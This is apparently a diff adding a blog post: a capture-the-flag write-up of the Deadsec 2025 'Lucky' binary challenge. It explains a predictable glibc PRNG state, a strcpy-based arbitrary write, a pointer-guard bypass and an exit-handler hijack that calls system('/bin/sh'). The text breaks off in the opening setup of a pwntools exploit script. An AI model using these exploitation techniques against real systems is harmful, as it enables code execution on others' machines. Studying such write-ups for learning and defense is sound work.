@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+    <title>Matus Mandzak</title>
+    <link rel="stylesheet" href="/assets/css/main.css">
+    <link rel="stylesheet" href="/assets/css/blog.css">
+  </head>
+  <body>
+    <div class="centered"><header class="flex justify-between align-center centered mb-3"><h1 class="no-margin flex text-xxl font-bold text-black">
+      <a href="/" class="red">Matus Mandzak <span class="yellow font-light">- Deadsec 2025- Lucky</span></a>
+    </h1>
+    <nav class="flex yellow"><div class="mr-2 ml-2">|</div>
+            <a class="page-link transition-colors hover:text-red text-l" href="/posts.html">blog</a></nav>
+</header>
+<div class="flex justify-between align-center centered mb-3">
+  veni vidi pwni
+</div>
+<p class="centered font-light no-margin text-xl grey5  mb-3 mt-12 ">  Deadsec 2025- Lucky </p>
+    <!-- Subtitle: left-aligned inside centered parent -->
+    <div class="centered">
+      <div class="fit-content mt-1 no-margin text-s font-bold grey5 no-margin rounded bg-red pl-2 pr-2">
+      pwn
+    </div>
+    </div>
+    
+    <div class="centered"><p><em>Exploiting __run_exit_handlers and “lucky” offsets</em></p>
+
+<blockquote>
+  <p>What is your wish?</p>
+</blockquote>
+
+<h2 id="challenge-overview">Challenge Overview</h2>
+<p>The challenge is a x86_64 binary in ELF format. The binary is stripped, but really small, so we don’t need to reverse that much other than understanding the program. The binary is very simple guessing game for numbers with only four functionalities - guess number, check numbers, get sample number and exit. The goal is to obtain shell/arbitrary code execution to get the flag.</p>
+
+<p>While analyzing code we see that the random module is initialized from state read from <code class="language-plaintext highlighter-rouge">/dev/urandom</code> which is usually safe.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">init_state</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+<span class="kt">void</span> <span class="nf">setup</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+   <span class="p">...</span>
+   <span class="n">__fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/urandom"</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+   <span class="p">...</span>
+   <span class="n">sVar1</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">__fd</span><span class="p">,</span><span class="o">&amp;</span><span class="n">rand_buffer</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
+   <span class="p">...</span>
+   <span class="n">rand</span><span class="p">();</span>
+   <span class="n">init_state</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+   <span class="n">init_state</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">_rand_buffer</span><span class="p">;</span>
+   <span class="n">setstate</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">init_state</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Note: in recent versions of glibc rand() is just wrapper for random()</p>
+
+<p>However by examining libc source we see <code class="language-plaintext highlighter-rouge">random()</code> invokes <code class="language-plaintext highlighter-rouge">__random_r()</code> which determines randomization based on rand_type in its internal structure.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__random_r</span> <span class="p">(</span><span class="k">struct</span> <span class="n">random_data</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">int32_t</span> <span class="o">*</span><span class="n">result</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="p">...</span>
+  <span class="n">state</span> <span class="o">=</span> <span class="n">buf</span><span class="o">-&gt;</span><span class="n">state</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">rand_type</span> <span class="o">==</span> <span class="n">TYPE_0</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="kt">int32_t</span> <span class="n">val</span> <span class="o">=</span> <span class="p">((</span><span class="n">state</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">1103515245U</span><span class="p">)</span> <span class="o">+</span> <span class="mi">12345U</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7fffffff</span><span class="p">;</span>
+      <span class="n">state</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span><span class="p">;</span>
+      <span class="o">*</span><span class="n">result</span> <span class="o">=</span> <span class="n">val</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="p">...</span>
+    <span class="p">}</span>
+  <span class="p">...</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>This internal structure is being set using <code class="language-plaintext highlighter-rouge">__init_state</code> function, therefore the binary will use TYPE_0 randomization as the first 4 bytes are zeroed out. 
+This is amazing because we can predict numbers based on just one value, which we can get using program’s get lucky number functionality.</p>
+
+<p>While examining other functions one thing stands out as the strcpy is very weird way to copy data into to buffer.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">read_into_addr_len</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span><span class="n">ulong</span> <span class="n">len</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">&lt;</span> <span class="mh">0x21</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)(</span><span class="kt">long</span><span class="p">)</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">buf32</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buf32</span><span class="p">,</span><span class="n">len</span><span class="p">);</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span><span class="n">buf32</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>There are two functions invoking this <code class="language-plaintext highlighter-rouge">read_into_addr_len</code> with stack address and len = 8 and 16 respectively. Even though the functions invoking this are relatively safe from any overflows. Chaining both of them will result in overflow.</p>
+
+<p>When we guess the correct number we get a chance to write a “Comment”, note this comment isn’t used anywhere in the program.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">check_number</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+   <span class="kt">char</span> <span class="n">comment</span> <span class="p">[</span><span class="mi">24</span><span class="p">];</span>
+   <span class="n">uint</span> <span class="n">number</span><span class="p">;</span>
+   <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+   
+   <span class="n">number</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
+   <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+   <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="mh">0x1ff</span> <span class="o">&lt;</span> <span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+         <span class="n">puts</span><span class="p">(</span><span class="s">"That</span><span class="se">\'</span><span class="s">s too bad :(</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+         <span class="k">return</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">ulong</span> <span class="o">*</span><span class="p">)(</span><span class="n">mmap_array</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="n">number</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+      <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+   <span class="p">}</span>
+   <span class="n">puts</span><span class="p">(</span><span class="s">"Congratulation.</span><span class="se">\n</span><span class="s">You are super rich now!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+   <span class="n">puts</span><span class="p">(</span><span class="s">"Any comment please : "</span><span class="p">);</span>
+   <span class="n">read_into_addr_len</span><span class="p">(</span><span class="n">comment</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
+   <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The other function is the guess number which allows us to enter number which will be stored to mmaped array of our guesses.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kt">void</span> <span class="nf">guess_number</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+   <span class="kt">int</span> <span class="n">idx2</span><span class="p">;</span>
+   <span class="kt">char</span> <span class="n">number</span> <span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+   <span class="kt">long</span> <span class="n">idx</span><span class="p">;</span>
+   <span class="n">uint</span> <span class="n">i</span><span class="p">;</span>
+   
+   <span class="n">number</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+   <span class="n">number</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+   <span class="n">number</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+   <span class="n">number</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+   <span class="n">number</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+   <span class="n">number</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+   <span class="n">number</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+   <span class="n">number</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+   <span class="n">puts</span><span class="p">(</span><span class="s">"Lottery index : "</span><span class="p">);</span>
+   <span class="n">idx2</span> <span class="o">=</span> <span class="n">get_idx</span><span class="p">();</span>
+   <span class="n">idx</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">idx2</span><span class="p">;</span>
+   <span class="k">if</span> <span class="p">((</span><span class="n">idx</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="mh">0x1ff</span> <span class="o">&lt;</span> <span class="n">idx</span><span class="p">))</span> <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Bad index :(</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+   <span class="p">}</span>
+   <span class="k">else</span> <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Lottery number : "</span><span class="p">);</span>
+      <span class="n">read_into_addr_len</span><span class="p">(</span><span class="n">number</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
+      <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+         <span class="k">if</span> <span class="p">(</span><span class="n">number</span><span class="p">[(</span><span class="kt">int</span><span class="p">)</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\n'</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">number</span><span class="p">[(</span><span class="kt">int</span><span class="p">)</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
+         <span class="p">}</span>
+      <span class="p">}</span>
+      <span class="n">strcpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">idx</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">mmap_array</span><span class="p">),</span><span class="n">number</span><span class="p">);</span>
+   <span class="p">}</span>
+   <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>We can chain these to functions to achieve overflow on number char array in <code class="language-plaintext highlighter-rouge">guess_number</code> function.
+To achieve this we must do following:</p>
+<ol>
+  <li>guess the correct next number</li>
+  <li>call check_number function and win</li>
+  <li>write comment with length &gt; 8</li>
+  <li>call guess_number with 8 digit number and overwrite idx with the comment[8:] data</li>
+</ol>
+
+<p><code class="language-plaintext highlighter-rouge">guess_number</code> will only zero out the initial 8 bytes however by filling them out with our input the strcpy will copy out spare data left out in our comment. This allows us to overwrite idx which is used later in strcpy, thus achieving arbitrary write primitive from mmaped_region.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>The arbitrary write primitive is powerful. We can write an string 8 byte value of our choice + index to any location calculated as mmap_array + idx * 8. Since idx is a signed long that we control, we can write to addresses both before and after our mmap_array, giving us a true arbitrary write-what-where primitive.</p>
+
+<h4 id="the-target-__run_exit_handlers-and-the-initial-struct">The Target: __run_exit_handlers and the initial struct</h4>
+
+<p>When a program exits cleanly (via exit() or returning from main), glibc calls the __run_exit_handlers function. This function is responsible for calling functions registered with atexit and on_exit, among other cleanup tasks. These handlers are stored in a linked list of exit_function_list structures, with the first, statically allocated list being the initial struct located in libc’s .bss section.</p>
+
+<p>An <code class="language-plaintext highlighter-rouge">exit_function</code> entry within this structure looks something like this:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">exit_function</span> <span class="p">{</span>
+  <span class="kt">long</span> <span class="kt">int</span> <span class="n">flavor</span><span class="p">;</span>
+  <span class="k">union</span> <span class="p">{</span>
+    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">at</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">);</span>
+    <span class="k">struct</span> <span class="p">{</span>
+      <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fn</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span> <span class="n">status</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">);</span>
+      <span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">;</span>
+    <span class="p">}</span> <span class="n">on</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="p">{</span>
+      <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fn</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">,</span> <span class="kt">int</span> <span class="n">status</span><span class="p">);</span>
+      <span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">;</span>
+      <span class="kt">void</span> <span class="o">*</span><span class="n">dso_handle</span><span class="p">;</span>
+    <span class="p">}</span> <span class="n">cxa</span><span class="p">;</span>
+  <span class="p">}</span> <span class="n">func</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>This is an ideal target. By overwriting an entry in the <code class="language-plaintext highlighter-rouge">initial.fns</code> array, we can:</p>
+<ol>
+  <li>Set the <code class="language-plaintext highlighter-rouge">flavor</code> to <code class="language-plaintext highlighter-rouge">ef_cxa</code> (value 4) or <code class="language-plaintext highlighter-rouge">ef_on</code> (value 2).</li>
+  <li>Overwrite <code class="language-plaintext highlighter-rouge">func.cxa.fn</code> with a pointer to <code class="language-plaintext highlighter-rouge">system</code>.</li>
+  <li>Overwrite <code class="language-plaintext highlighter-rouge">func.cxa.arg</code> with a pointer to the string <code class="language-plaintext highlighter-rouge">"/bin/sh"</code>.</li>
+</ol>
+
+<h3 id="bypassing-pointer-guarding">Bypassing Pointer Guarding</h3>
+
+<p>These function pointers are protected by <code class="language-plaintext highlighter-rouge">glibc</code>’s pointer guarding mechanism. The <code class="language-plaintext highlighter-rouge">fn</code> pointer is mangled before being stored:</p>
+
+<p><code class="language-plaintext highlighter-rouge">stored_ptr = ROR(actual_ptr, 0x11) ^ pointer_guard;</code></p>
+
+<p>And before being called, it is de-mangled:</p>
+
+<p><code class="language-plaintext highlighter-rouge">actual_ptr = ROL(stored_ptr ^ pointer_guard, 0x11);</code></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">pointer_guard</code> is a random 64-bit value stored in Thread-Local Storage (TLS) at the offset <code class="language-plaintext highlighter-rouge">fs:0x30</code>. To successfully hijack control flow, we must know or control this guard. 
+The thread local storage is usually stored right before libc.</p>
+
+<h3 id="the-lucky-offset">The “Lucky” Offset</h3>
+
+<p>The primary obstacle is ASLR, which randomizes the base addresses of <code class="language-plaintext highlighter-rouge">libc</code>, the stack, the heap, <code class="language-plaintext highlighter-rouge">ld.so</code>, and the <code class="language-plaintext highlighter-rouge">fs</code> segment. Without a leak, we don’t know the absolute addresses of our targets: the <code class="language-plaintext highlighter-rouge">pointer_guard</code> at <code class="language-plaintext highlighter-rouge">fs:0x30</code> and the <code class="language-plaintext highlighter-rouge">initial</code> struct in libc’s <code class="language-plaintext highlighter-rouge">.bss</code>.</p>
+
+<p>The mmaped region is allocated in space between libc and ld right before ld.</p>
+
+<p>Given fsbase is allocated before libc we need to guess this offset.</p>
+
+<h3 id="the-attack-plan">The Attack Plan</h3>
+
+<p>My solutions requires two stages:</p>
+<ol>
+  <li>leaking libc</li>
+  <li>getting shell</li>
+</ol>
+
+<p>Originally I tried leaking libc using <code class="language-plaintext highlighter-rouge">puts@plt(puts@got)</code> and returning back to main. However I wasn’t able to return anywhere else than to <code class="language-plaintext highlighter-rouge">_start</code>. I tried exploiting it this way, but returning to start would also create second mmap and different offset, which I did not have any idea how big was on remote.</p>
+
+<p>Given we exit_fncs array is 32 big, we can chain leak with calls to check_number and guess_number to write system address.</p>
+
+<h5 id="handling-null-bytes">Handling Null Bytes</h5>
+<p>Since our write primitive is strcpy, we cannot write null bytes. However the handler replaces all newline characters with null bytes before our Write-At-Index. Therefore we can still utilize our write primitive while slowly overwriting bytes with null bytes one by one.</p>
+
+<h4 id="stage-1-overwrite-pointer-guard-and-prepare-the-chain">Stage 1: Overwrite Pointer Guard and Prepare the Chain</h4>
+
+<ul>
+  <li>
+    <p>Bruteforce <code class="language-plaintext highlighter-rouge">libc-ld</code> offset.</p>
+  </li>
+  <li>
+    <p>Overwrite Pointer Guard at <code class="language-plaintext highlighter-rouge">fs:0x30</code> with a known value (e.g., <code class="language-plaintext highlighter-rouge">0x7f7f7f7f7f7f7f7f</code>)</p>
+  </li>
+  <li>
+    <p>The <code class="language-plaintext highlighter-rouge">__run_exit_handlers</code> function processes the fns array in reverse, starting from the highest index and counting down (–cur-&gt;idx).  Therefore our fnc array should look like this</p>
+  </li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function count
+spot_for_system("/bin/sh")
+guess_number &lt;- /bin/sh write for rdi
+check_number
+guess_number &lt;- null byte write for rdi
+check_number
+guess_number &lt;- system write
+check_number 
+puts@plt(puts@got)
+</code></pre></div></div>
+
+<h4 id="stage-2-exit-handler-chain">Stage 2: Exit Handler Chain</h4>
+<p>After setting up exit fncs array we call exit to start execution and call <code class="language-plaintext highlighter-rouge">system</code> with <code class="language-plaintext highlighter-rouge">/bin/sh</code> as an argument to our predefined spot.</p>
+
+<h3 id="azure">Azure</h3>
+<p>There was an alarm set up for 60 seconds, so our exploit had to run in that time. The problem was we were not getting our responses fast enough from the server. For that reason we spun up azure vps close to their server and in about an hour we got the flag.</p>
+
+<h2 id="script">script</h2>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="n">ctypes</span> <span class="kn">import</span> <span class="n">CDLL</span>
+<span class="kn">import</span> <span class="n">time</span>
+<span class="kn">import</span> <span class="n">subprocess</span>
+<span class="kn">import</span> <span class="n">json</span>
+
+<span class="n">glibc</span> <span class="o">=</span> <span class="nc">CDLL</span><span class="p">(</span><span class="sh">"</span><span class="s">./libc.so.6</span><span class="sh">"</span><span class="p">)</span>
+
+
+<span class="n">e</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./prob_patched</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./libc.so.6</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">ld</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./ld-linux-x86-64.so.2</span><span class="sh">"</span><span class="p">)</span>
+
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">e</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="sh">"</span><span class="s">tmux</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">splitw</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">-v</span><span class="sh">"</span><span class="p">]</span>
+<span class="n">GDB</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"""</span><span class="s">
+set follow-fork-mode parent
+#b *0x004015aa
+#set *(long *)rand = 0xc3c031
+
+#b *0x401640
+b *__run_exit_handlers+229
+c</span><span class="sh">"""</span>
+
+
+<span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="nf">process</span><span class="p">([</span><span class="n">e</span><span class="p">.</span><span class="n">path</span><span class="p">],</span> <span class="n">aslr</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+            <span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">GDB</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="c1"># r = remote("nc.deadsec.quest", 32370)
+</span>        <span class="n">r</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">localhost</span><span class="sh">"</span><span class="p">,</span> <span class="mi">15252</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">r</span>
+
+
+<span class="c1"># abbreviations
+</span><span class="n">cst</span> <span class="o">=</span> <span class="n">constants</span>
+<span class="n">shc</span> <span class="o">=</span> <span class="n">shellcraft</span>
+
+<span class="c1"># logging
+</span><span class="n">linfo</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">)</span>
+<span class="n">lwarn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">warn</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">)</span>
+<span class="n">lerr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">)</span>
+<span class="n">lprog</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">)</span>
+<span class="n">lhex</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="o">=</span><span class="sh">"</span><span class="s">leak</span><span class="sh">"</span><span class="p">:</span> <span class="nf">linfo</span><span class="p">(</span><span class="sh">"</span><span class="s">%#018x &lt;- %s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">))</span>
+<span class="n">phex</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="o">=</span><span class="sh">"</span><span class="s">leak</span><span class="sh">"</span><span class="p">:</span> <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">%#018x &lt;- %s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">))</span>
+
+
+<span class="c1"># type manipulation
+</span><span class="n">byt</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span> <span class="k">if</span> <span class="nf">isinstance</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="p">(</span><span class="nb">bytes</span><span class="p">,</span> <span class="nb">bytearray</span><span class="p">))</span> <span class="k">else</span> <span class="nf">str</span><span class="p">(</span><span class="n">x</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span>
+<span class="n">rpad</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">s</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span> <span class="n">v</span><span class="o">=</span><span class="sa">b</span><span class="sh">"</span><span class="se">\0</span><span class="sh">"</span><span class="p">:</span> <span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
+<span class="n">lpad</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">s</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span> <span class="n">v</span><span class="o">=</span><span class="sa">b</span><span class="sh">"</span><span class="se">\0</span><span class="sh">"</span><span class="p">:</span> <span class="n">x</span><span class="p">.</span><span class="nf">rjust</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
+<span class="n">hpad</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">s</span><span class="o">=</span><span class="mi">0</span><span class="p">:</span> <span class="sh">"</span><span class="s">%0*x</span><span class="sh">"</span> <span class="o">%</span> <span class="p">((</span><span class="n">s</span> <span class="k">if</span> <span class="n">s</span> <span class="nf">else </span><span class="p">((</span><span class="n">x</span><span class="p">.</span><span class="nf">bit_length</span><span class="p">()</span> <span class="o">//</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">),</span> <span class="n">x</span><span class="p">)</span>
+<span class="n">upad</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="nf">rpad</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
+<span class="n">cpad</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">s</span><span class="p">:</span> <span class="nf">byt</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">+</span> <span class="nf">cyc</span><span class="p">(</span><span class="n">s</span><span class="p">)[</span><span class="nf">len</span><span class="p">(</span><span class="nf">byt</span><span class="p">(</span><span class="n">x</span><span class="p">))</span> <span class="p">:]</span>
+<span class="n">tob</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="nf">hpad</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
+
+<span class="c1"># elf aliases
+</span><span class="n">gelf</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">elf</span><span class="o">=</span><span class="bp">None</span><span class="p">:</span> <span class="n">elf</span> <span class="k">if</span> <span class="n">elf</span> <span class="k">else</span> <span class="n">exe</span>
